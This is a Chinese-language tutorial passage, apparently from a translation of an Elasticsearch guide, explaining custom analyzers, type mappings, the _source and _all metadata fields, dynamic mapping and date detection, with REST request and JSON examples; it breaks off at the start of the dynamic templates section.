<h2 id="配置分析器"><a href="#配置分析器" class="headerlink" title="配置分析器"></a>配置分析器</h2><p>第三个重要的索引设置是 analysis 部分， 用来配置已存在的分析器或针对你的索引创建新的自定义分析器。<br>在 分析与分析器 ，我们介绍了一些内置的 分析器，用于将全文字符串转换为适合搜索的倒排索引。<br>standard 分析器是用于全文字段的默认分析器， 对于大部分西方语系来说是一个不错的选择。 它包括了以下几点：</p>
<p>1.standard 分词器，通过单词边界分割输入的文本。<br>2.standard 语汇单元过滤器，目的是整理分词器触发的语汇单元（但是目前什么都没做）。<br>3.lowercase 语汇单元过滤器，转换所有的语汇单元为小写。<br>4.stop 语汇单元过滤器，删除停用词–对搜索相关性影响不大的常用词，如 a ， the ， and ， is 。</p>
<p>默认情况下，停用词过滤器是被禁用的。如需启用它，你可以通过创建一个基于 standard 分析器的自定义分析器并设置 stopwords 参数。 可以给分析器提供一个停用词列表，或者告知使用一个基于特定语言的预定义停用词列表。</p>
<p>在下面的例子中，我们创建了一个新的分析器，叫做 es_std ， 并使用预定义的 西班牙语停用词列表：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT /spanish_docs</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;analysis&quot;: &#123;</span><br><span class="line">            &quot;analyzer&quot;: &#123;</span><br><span class="line">                &quot;es_std&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;:      &quot;standard&quot;,</span><br><span class="line">                    &quot;stopwords&quot;: &quot;_spanish_&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>es_std 分析器不是全局的–它仅仅存在于我们定义的 spanish_docs 索引中。 为了使用 analyze API来对它进行测试，我们必须使用特定的索引名：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /spanish_docs/_analyze?analyzer=es_std</span><br><span class="line">El veloz zorro marrón</span><br></pre></td></tr></table></figure></p>
<p>简化的结果显示西班牙语停用词 El 已被正确的移除：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;tokens&quot; : [</span><br><span class="line">    &#123; &quot;token&quot; :    &quot;veloz&quot;,   &quot;position&quot; : 2 &#125;,</span><br><span class="line">    &#123; &quot;token&quot; :    &quot;zorro&quot;,   &quot;position&quot; : 3 &#125;,</span><br><span class="line">    &#123; &quot;token&quot; :    &quot;marrón&quot;,  &quot;position&quot; : 4 &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="自定义分析器"><a href="#自定义分析器" class="headerlink" title="自定义分析器"></a>自定义分析器</h2><p>你可以通过在一个适合你的特定数据的设置之中组合字符过滤器、分词器、词汇单元过滤器来创建自定义的分析器。</p>
<p>在 分析与分析器 我们说过，一个 分析器 就是在一个包里面组合了三种函数的一个包装器， 三种函数按照顺序被执行:<br>字符过滤器<br>字符过滤器 用来 整理 一个尚未被分词的字符串。例如，如果我们的文本是HTML格式的，它会包含像 </p><p> 或者 <div> 这样的HTML标签，这些标签是我们不想索引的。我们可以使用 html清除 字符过滤器 来移除掉所有的HTML标签，并且像把 &Aacute; 转换为相对应的Unicode字符 Á 这样，转换HTML实体。</div></p>
<p>一个分析器可能有0个或者多个字符过滤器。</p>
<p>分词器<br>一个分析器 必须 有一个唯一的分词器。 分词器把字符串分解成单个词条或者词汇单元。 标准 分析器里使用的 标准 分词器 把一个字符串根据单词边界分解成单个词条，并且移除掉大部分的标点符号，然而还有其他不同行为的分词器存在。</p>
<p>例如， 关键词 分词器 完整地输出 接收到的同样的字符串，并不做任何分词。 空格 分词器 只根据空格分割文本 。 正则 分词器 根据匹配正则表达式来分割文本 。</p>
<p>词单元过滤器<br>经过分词，作为结果的 词单元流 会按照指定的顺序通过指定的词单元过滤器 。</p>
<p>词单元过滤器可以修改、添加或者移除词单元。我们已经提到过 lowercase 和 stop 词过滤器 ，但是在 Elasticsearch 里面还有很多可供选择的词单元过滤器。 词干过滤器 把单词 遏制 为 词干。 ascii_folding 过滤器移除变音符，把一个像 “très” 这样的词转换为 “tres” 。 ngram 和 edge_ngram 词单元过滤器 可以产生 适合用于部分匹配或者自动补全的词单元。</p>
<h2 id="创建一个自定义分析器编辑"><a href="#创建一个自定义分析器编辑" class="headerlink" title="创建一个自定义分析器编辑"></a>创建一个自定义分析器编辑</h2><p>和我们之前配置 es_std 分析器一样，我们可以在 analysis 下的相应位置设置字符过滤器、分词器和词单元过滤器:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT /my_index</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;analysis&quot;: &#123;</span><br><span class="line">            &quot;char_filter&quot;: &#123; ... custom character filters ... &#125;,</span><br><span class="line">            &quot;tokenizer&quot;:   &#123; ...    custom tokenizers     ... &#125;,</span><br><span class="line">            &quot;filter&quot;:      &#123; ...   custom token filters   ... &#125;,</span><br><span class="line">            &quot;analyzer&quot;:    &#123; ...    custom analyzers      ... &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>作为示范，让我们一起来创建一个自定义分析器吧，这个分析器可以做到下面的这些事:<br>1.使用 html清除 字符过滤器移除HTML部分。<br>2.使用一个自定义的 映射 字符过滤器把 &amp; 替换为 “ and “ ：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"char_filter": &#123;</span><br><span class="line">    "&amp;_to_and": &#123;</span><br><span class="line">        "type":       "mapping",</span><br><span class="line">        "mappings": [ "&amp;=&gt; and "]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>3.使用 标准 分词器分词。<br>4.小写词条，使用 小写 词过滤器处理。<br>5.使用自定义 停止 词过滤器移除自定义的停止词列表中包含的词：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"filter": &#123;</span><br><span class="line">    "my_stopwords": &#123;</span><br><span class="line">        "type":        "stop",</span><br><span class="line">        "stopwords": [ "the", "a" ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们的分析器定义用我们之前已经设置好的自定义过滤器组合了已经定义好的分词器和过滤器：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"analyzer": &#123;</span><br><span class="line">    "my_analyzer": &#123;</span><br><span class="line">        "type":           "custom",</span><br><span class="line">        "char_filter":  [ "html_strip", "&amp;_to_and" ],</span><br><span class="line">        "tokenizer":      "standard",</span><br><span class="line">        "filter":       [ "lowercase", "my_stopwords" ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>汇总起来，完整的 创建索引 请求 看起来应该像这样：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"settings"</span>: &#123;</span><br><span class="line">        <span class="string">"analysis"</span>: &#123;</span><br><span class="line">            <span class="string">"char_filter"</span>: &#123;</span><br><span class="line">                <span class="string">"&amp;_to_and"</span>: &#123;</span><br><span class="line">                    <span class="string">"type"</span>:       <span class="string">"mapping"</span>,</span><br><span class="line">                    <span class="string">"mappings"</span>: [ <span class="string">"&amp;=&gt; and "</span>]</span><br><span class="line">            &#125;&#125;,</span><br><span class="line">            <span class="string">"filter"</span>: &#123;</span><br><span class="line">                <span class="string">"my_stopwords"</span>: &#123;</span><br><span class="line">                    <span class="string">"type"</span>:       <span class="string">"stop"</span>,</span><br><span class="line">                    <span class="string">"stopwords"</span>: [ <span class="string">"the"</span>, <span class="string">"a"</span> ]</span><br><span class="line">            &#125;&#125;,</span><br><span class="line">            <span class="string">"analyzer"</span>: &#123;</span><br><span class="line">                <span class="string">"my_analyzer"</span>: &#123;</span><br><span class="line">                    <span class="string">"type"</span>:         <span class="string">"custom"</span>,</span><br><span class="line">                    <span class="string">"char_filter"</span>:  [ <span class="string">"html_strip"</span>, <span class="string">"&amp;_to_and"</span> ],</span><br><span class="line">                    <span class="string">"tokenizer"</span>:    <span class="string">"standard"</span>,</span><br><span class="line">                    <span class="string">"filter"</span>:       [ <span class="string">"lowercase"</span>, <span class="string">"my_stopwords"</span> ]</span><br><span class="line">            &#125;&#125;</span><br><span class="line">&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>索引被创建以后，使用 analyze API 来 测试这个新的分析器：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /my_index/_analyze?analyzer=my_analyzer</span><br><span class="line">The quick &amp; brown fox</span><br></pre></td></tr></table></figure></p>
<p>下面的缩略结果展示出我们的分析器正在正确地运行：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokens"</span> : [</span><br><span class="line">      &#123; <span class="attr">"token"</span> :   <span class="string">"quick"</span>,    <span class="attr">"position"</span> : <span class="number">2</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">"token"</span> :   <span class="string">"and"</span>,      <span class="attr">"position"</span> : <span class="number">3</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">"token"</span> :   <span class="string">"brown"</span>,    <span class="attr">"position"</span> : <span class="number">4</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">"token"</span> :   <span class="string">"fox"</span>,      <span class="attr">"position"</span> : <span class="number">5</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个分析器现在是没有多大用处的，除非我们告诉 Elasticsearch在哪里用上它。我们可以像下面这样把这个分析器应用在一个 string 字段上：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index/_mapping/my_type</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"properties"</span>: &#123;</span><br><span class="line">        <span class="string">"title"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>:      <span class="string">"string"</span>,</span><br><span class="line">            <span class="string">"analyzer"</span>:  <span class="string">"my_analyzer"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="类型和映射"><a href="#类型和映射" class="headerlink" title="类型和映射"></a>类型和映射</h2><p>类型 在 Elasticsearch 中表示一类相似的文档。 类型由 名称 —比如 user 或 blogpost —和 映射 组成。</p>
<p>映射, 就像数据库中的 schema ，描述了文档可能具有的字段或 属性 、 每个字段的数据类型—比如 string, integer 或 date —以及Lucene是如何索引和存储这些字段的。</p>
<p>类型可以很好的抽象划分相似但不相同的数据。但由于 Lucene 的处理方式，类型的使用有些限制。</p>
<h2 id="Lucene-如何处理文档编辑"><a href="#Lucene-如何处理文档编辑" class="headerlink" title="Lucene 如何处理文档编辑"></a>Lucene 如何处理文档编辑</h2><p>在 Lucene 中，一个文档由一组简单的键值对组成。 每个字段都可以有多个值，但至少要有一个值。 类似的，一个字符串可以通过分析过程转化为多个值。Lucene 不关心这些值是字符串、数字或日期–所有的值都被当做 不透明字节 。</p>
<p>当我们在 Lucene 中索引一个文档时，每个字段的值都被添加到相关字段的倒排索引中。你也可以将未处理的原始数据 存储 起来，以便这些原始数据在之后也可以被检索到。</p>
<h2 id="类型是如何实现的"><a href="#类型是如何实现的" class="headerlink" title="类型是如何实现的"></a>类型是如何实现的</h2><p>Elasticsearch 类型是 以 Lucene 处理文档的这个方式为基础来实现的。一个索引可以有多个类型，这些类型的文档可以存储在相同的索引中。</p>
<p>Lucene 没有文档类型的概念，每个文档的类型名被存储在一个叫 _type 的元数据字段上。 当我们要检索某个类型的文档时, Elasticsearch 通过在 _type 字段上使用过滤器限制只返回这个类型的文档。</p>
<p>Lucene 也没有映射的概念。 映射是 Elasticsearch 将复杂 JSON 文档 映射 成 Lucene 需要的扁平化数据的方式。</p>
<p>例如，在 user 类型中， name 字段的映射可以声明这个字段是 string 类型，并且它的值被索引到名叫 name 的倒排索引之前，需要通过 whitespace 分词器分析：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"name": &#123;</span><br><span class="line">    "type":     "string",</span><br><span class="line">    "analyzer": "whitespace"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="避免类型陷阱"><a href="#避免类型陷阱" class="headerlink" title="避免类型陷阱"></a>避免类型陷阱</h2><p>这导致了一个有趣的思想实验： 如果有两个不同的类型，每个类型都有同名的字段，但映射不同（例如：一个是字符串一个是数字），将会出现什么情况？</p>
<p>简单回答是，Elasticsearch 不会允许你定义这个映射。当你配置这个映射时，将会出现异常。</p>
<p>详细回答是，每个 Lucene 索引中的所有字段都包含一个单一的、扁平的模式。一个特定字段可以映射成 string 类型也可以是 number 类型，但是不能两者兼具。因为类型是 Elasticsearch 添加的 优于 Lucene 的额外机制（以元数据 _type 字段的形式），在 Elasticsearch 中的所有类型最终都共享相同的映射。</p>
<p>以 data 索引中两种类型的映射为例：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"data"</span>: &#123;</span><br><span class="line">      <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">         <span class="attr">"people"</span>: &#123;</span><br><span class="line">            <span class="attr">"properties"</span>: &#123;</span><br><span class="line">               <span class="attr">"name"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"string"</span>,</span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="attr">"address"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="attr">"transactions"</span>: &#123;</span><br><span class="line">            <span class="attr">"properties"</span>: &#123;</span><br><span class="line">               <span class="attr">"timestamp"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"date"</span>,</span><br><span class="line">                  <span class="attr">"format"</span>: <span class="string">"strict_date_optional_time"</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="attr">"message"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>每个类型定义两个字段 (分别是 “name”/“address” 和 “timestamp”/“message” )。它们看起来是相互独立的，但在后台 Lucene 将创建一个映射，如:<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"data"</span>: &#123;</span><br><span class="line">      <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">        <span class="attr">"_type"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"string"</span>,</span><br><span class="line">          <span class="attr">"index"</span>: <span class="string">"not_analyzed"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"name"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">"address"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">"timestamp"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"long"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">"message"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注: 这不是真实有效的映射语法，只是用于演示</p>
<p>对于整个索引，映射在本质上被 扁平化 成一个单一的、全局的模式。这就是为什么两个类型不能定义冲突的字段：当映射被扁平化时，Lucene 不知道如何去处理。</p>
<h2 id="类型结论"><a href="#类型结论" class="headerlink" title="类型结论"></a>类型结论</h2><p>那么，这个讨论的结论是什么？技术上讲，多个类型可以在相同的索引中存在，只要它们的字段不冲突（要么因为字段是互为独占模式，要么因为它们共享相同的字段）。</p>
<p>重要的一点是: 类型可以很好的区分同一个集合中的不同细分。在不同的细分中数据的整体模式是相同的（或相似的）。</p>
<p>类型不适合 完全不同类型的数据 。如果两个类型的字段集是互不相同的，这就意味着索引中将有一半的数据是空的（字段将是 稀疏的 ），最终将导致性能问题。在这种情况下，最好是使用两个单独的索引。</p>
<p>总结：</p>
<p>1.正确: 将 kitchen 和 lawn-care 类型放在 products 索引中, 因为这两种类型基本上是相同的模式<br>2.错误: 将 products 和 logs 类型放在 data 索引中, 因为这两种类型互不相同。应该将它们放在不同的索引中。</p>
<h2 id="根对象"><a href="#根对象" class="headerlink" title="根对象"></a>根对象</h2><p>映射的最高一层被称为 根对象 ，它可能包含下面几项：<br>1.一个 properties 节点，列出了文档中可能包含的每个字段的映射<br>2.各种元数据字段，它们都以一个下划线开头，例如 _type 、 _id 和 _source<br>3.设置项，控制如何动态处理新的字段，例如 analyzer 、 dynamic_date_formats 和 dynamic_templates<br>4.其他设置，可以同时应用在根对象和其他 object 类型的字段上，例如 enabled 、 dynamic 和 include_in_all</p>
<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>我们已经在 核心简单域类型 和 复杂核心域类型 章节中介绍过文档字段和属性的三个 最重要的设置：</p>
<p>type<br>字段的数据类型，例如 string 或 date<br>index<br>字段是否应当被当成全文来搜索（ analyzed ），或被当成一个准确的值（ not_analyzed ），还是完全不可被搜索（ no ）<br>analyzer<br>确定在索引和搜索时全文字段使用的 analyzer</p>
<h2 id="元数据-source-字段"><a href="#元数据-source-字段" class="headerlink" title="元数据: _source 字段"></a>元数据: _source 字段</h2><p>默认地，Elasticsearch 在 _source 字段存储代表文档体的JSON字符串。和所有被存储的字段一样， _source 字段在被写入磁盘之前先会被压缩。</p>
<p>这个字段的存储几乎总是我们想要的，因为它意味着下面的这些：</p>
<p>1.搜索结果包括了整个可用的文档——不需要额外的从另一个的数据仓库来取文档。<br>2.如果没有 _source 字段，部分 update 请求不会生效。<br>3.当你的映射改变时，你需要重新索引你的数据，有了_source字段你可以直接从Elasticsearch这样做，而不必从另一个（通常是速度更慢的）数据仓库取回你的所有文档。<br>4.当你不需要看到整个文档时，单个字段可以从 _source 字段提取和通过 get 或者 search 请求返回。<br>5.调试查询语句更加简单，因为你可以直接看到每个文档包括什么，而不是从一列id猜测它们的内容。</p>
<p>然而，存储 _source 字段的确要使用磁盘空间。如果上面的原因对你来说没有一个是重要的，你可以用下面的映射禁用 _source 字段：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"mappings"</span>: &#123;</span><br><span class="line">        <span class="string">"my_type"</span>: &#123;</span><br><span class="line">            <span class="string">"_source"</span>: &#123;</span><br><span class="line">                <span class="string">"enabled"</span>:  <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在一个搜索请求里，你可以通过在请求体中指定 _source 参数，来达到只获取特定的字段的效果：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>:   &#123; <span class="string">"match_all"</span>: &#123;&#125;&#125;,</span><br><span class="line">    <span class="string">"_source"</span>: [ <span class="string">"title"</span>, <span class="string">"created"</span> ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这些字段的值会从 _source 字段被提取和返回，而不是返回整个 _source 。</p>
<p>Stored Fields 被存储字段</p>
<p>为了之后的检索，除了索引一个字段的值，你 还可以选择 存储 原始字段值。有 Lucene 使用背景的用户使用被存储字段来选择他们想要在搜索结果里面返回的字段。事实上， _source 字段就是一个被存储的字段。</p>
<p>在Elasticsearch中，对文档的个别字段设置存储的做法通常不是最优的。整个文档已经被存储为 _source 字段。使用 _source 参数提取你需要的字段总是更好的。</p>
<h2 id="元数据-all-字段"><a href="#元数据-all-字段" class="headerlink" title="元数据: _all 字段"></a>元数据: _all 字段</h2><p>在 轻量 搜索 中，我们介绍了 _all 字段：一个把其它字段值 当作一个大字符串来索引的特殊字段。 query_string 查询子句(搜索 ?q=john )在没有指定字段时默认使用 _all 字段。</p>
<p>_all 字段在新应用的探索阶段，当你还不清楚文档的最终结构时是比较有用的。你可以使用这个字段来做任何查询，并且有很大可能找到需要的文档：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"match"</span>: &#123;</span><br><span class="line">        <span class="string">"_all"</span>: <span class="string">"john smith marketing"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>随着应用的发展，搜索需求变得更加明确，你会发现自己越来越少使用 _all 字段。 _all 字段是搜索的应急之策。通过查询指定字段，你的查询更加灵活、强大，你也可以对相关性最高的搜索结果进行更细粒度的控制。</p>
<p>relevance algorithm 考虑的一个最重要的原则是字段的长度：字段越短越重要。 在较短的 title 字段中出现的短语可能比在较长的 content 字段中出现的短语更加重要。字段长度的区别在 _all 字段中不会出现。</p>
<p>如果你不再需要 _all 字段，你可以通过下面的映射来禁用：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index/_mapping/my_type</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"my_type"</span>: &#123;</span><br><span class="line">        <span class="string">"_all"</span>: &#123; <span class="string">"enabled"</span>: <span class="literal">false</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过 include_in_all 设置来逐个控制字段是否要包含在 _all 字段中，默认值是 true<code>。在一个对象(或根对象)上设置</code>include_in_all 可以修改这个对象中的所有字段的默认行为。</p>
<p>你可能想要保留 _all 字段作为一个只包含某些特定字段的全文字段，例如只包含 title<code>，</code>overview<code>，</code>summary 和 tags<code>。 相对于完全禁用</code>_all 字段，你可以为所有字段默认禁用 include_in_all 选项，仅在你选择的字段上启用：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index/my_type/_mapping</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"my_type"</span>: &#123;</span><br><span class="line">        <span class="string">"include_in_all"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"properties"</span>: &#123;</span><br><span class="line">            <span class="string">"title"</span>: &#123;</span><br><span class="line">                <span class="string">"type"</span>:           <span class="string">"string"</span>,</span><br><span class="line">                <span class="string">"include_in_all"</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>记住，_all 字段仅仅是一个 经过分词的 string 字段。它使用默认分词器来分析它的值，不管这个值原本所在字段指定的分词器。就像所有 string 字段，你可以配置 _all 字段使用的分词器：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index/my_type/_mapping</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"my_type"</span>: &#123;</span><br><span class="line">        <span class="string">"_all"</span>: &#123; <span class="string">"analyzer"</span>: <span class="string">"whitespace"</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="元数据：文档标识"><a href="#元数据：文档标识" class="headerlink" title="元数据：文档标识"></a>元数据：文档标识</h2><p>文档标识与四个元数据字段 相关：</p>
<p>_id<br>文档的 ID 字符串<br>_type<br>文档的类型名<br>_index<br>文档所在的索引<br>_uid<br>_type 和 _id 连接在一起构造成 type#id<br>默认情况下， _uid 字段是被存储（可取回）和索引（可搜索）的。 _type 字段被索引但是没有存储， _id 和 _index 字段则既没有被索引也没有被存储，这意味着它们并不是真实存在的。</p>
<p>尽管如此，你仍然可以像真实字段一样查询 _id 字段。Elasticsearch 使用 _uid 字段来派生出 _id 。 虽然你可以修改这些字段的 index 和 store 设置，但是基本上不需要这么做。</p>
<h2 id="动态映射"><a href="#动态映射" class="headerlink" title="动态映射"></a>动态映射</h2><p>当 Elasticsearch 遇到文档中以前 未遇到的字段，它用 dynamic mapping 来确定字段的数据类型并自动把新的字段添加到类型映射。</p>
<p>有时这是想要的行为有时又不希望这样。通常没有人知道以后会有什么新字段加到文档，但是又希望这些字段被自动的索引。也许你只想忽略它们。如果Elasticsearch是作为重要的数据存储，可能就会期望遇到新字段就会抛出异常，这样能及时发现问题。</p>
<p>幸运的是可以用 dynamic 配置来控制这种行为 ，可接受的选项如下：</p>
<p>true<br>   动态添加新的字段–缺省<br>false<br>   忽略新的字段<br>strict<br>   如果遇到新字段抛出异常</p>
<p>配置参数 dynamic 可以用在根 object 或任何 object 类型的字段上。你可以将 dynamic 的默认值设置为 strict , 而只在指定的内部对象中开启它, 例如：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"mappings"</span>: &#123;</span><br><span class="line">        <span class="string">"my_type"</span>: &#123;</span><br><span class="line">            <span class="string">"dynamic"</span>:      <span class="string">"strict"</span>, (1)</span><br><span class="line">            <span class="string">"properties"</span>: &#123;</span><br><span class="line">                <span class="string">"title"</span>:  &#123; <span class="string">"type"</span>: <span class="string">"string"</span>&#125;,</span><br><span class="line">                <span class="string">"stash"</span>:  &#123;</span><br><span class="line">                    <span class="string">"type"</span>:     <span class="string">"object"</span>,</span><br><span class="line">                    <span class="string">"dynamic"</span>:  <span class="literal">true</span> (2)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>1.如果遇到新字段，对象 my_type 就会抛出异常。<br>2.而内部对象 stash 遇到新字段就会动态创建新字段。</p>
<p>使用上述动态映射， 你可以给 stash 对象添加新的可检索的字段：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index/my_type/1</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"title"</span>:   <span class="string">"This doc adds a new field"</span>,</span><br><span class="line">    <span class="string">"stash"</span>: &#123; <span class="string">"new_field"</span>: <span class="string">"Success!"</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但是对根节点对象 my_type 进行同样的操作会失败：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index/my_type/1</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"title"</span>:     <span class="string">"This throws a StrictDynamicMappingException"</span>,</span><br><span class="line">    <span class="string">"new_field"</span>: <span class="string">"Fail!"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>把 dynamic 设置为 false 一点儿也不会改变 _source 的字段内容。 _source 仍然包含被索引的整个JSON文档。只是新的字段不会被加到映射中也不可搜索。</p>
<h1 id="自定义动态映射"><a href="#自定义动态映射" class="headerlink" title="自定义动态映射"></a>自定义动态映射</h1><h2 id="日期检测"><a href="#日期检测" class="headerlink" title="日期检测"></a>日期检测</h2><p>当 Elasticsearch 遇到一个新的字符串字段时，它会检测这个字段是否包含一个可识别的日期，比如 2014-01-01 。 如果它像日期，这个字段就会被作为 date 类型添加。否则，它会被作为 string 类型添加。</p>
<p>有些时候这个行为可能导致一些问题。想象下，你有如下这样的一个文档：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">"note"</span>: <span class="string">"2014-01-01"</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>假设这是第一次识别 note 字段，它会被添加为 date 字段。但是如果下一个文档像这样：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">"note"</span>: <span class="string">"Logged out"</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>这显然不是一个日期，但为时已晚。这个字段已经是一个日期类型，这个 不合法的日期 将会造成一个异常。</p>
<p>日期检测可以通过在根对象上设置 date_detection 为 false 来关闭：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PUT /my_index</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"mappings"</span>: &#123;</span><br><span class="line">        <span class="string">"my_type"</span>: &#123;</span><br><span class="line">            <span class="string">"date_detection"</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用这个映射，字符串将始终作为 string 类型。如果你需要一个 date 字段，你必须手动添加。</p>
<p>Elasticsearch 判断字符串为日期的规则可以通过 dynamic_date_formats setting 来设置。</p>
<h2 id="动态模板"><a href="#动态模板" class="headerlink" title="动态模板"></a>动态模板</h2><p>使用 dynamic_templates ，你可以完全控制 新检测生成字段的映射。你甚至可以通过字段名称或数据类型来应用不同的映射。</p>
<p>每个模板都有一个名称， 你可以用来描述这个模板的用途， 一个 mapping 来指定映射应该怎样使用，以及至少一个参数 (如 match) 来定义这个模板适用于哪个字段。</p>
<p>模板按照顺序来检测；第一个匹配的模板会被启用。例如，我们给 string 类型字段定义两个模板：</p>
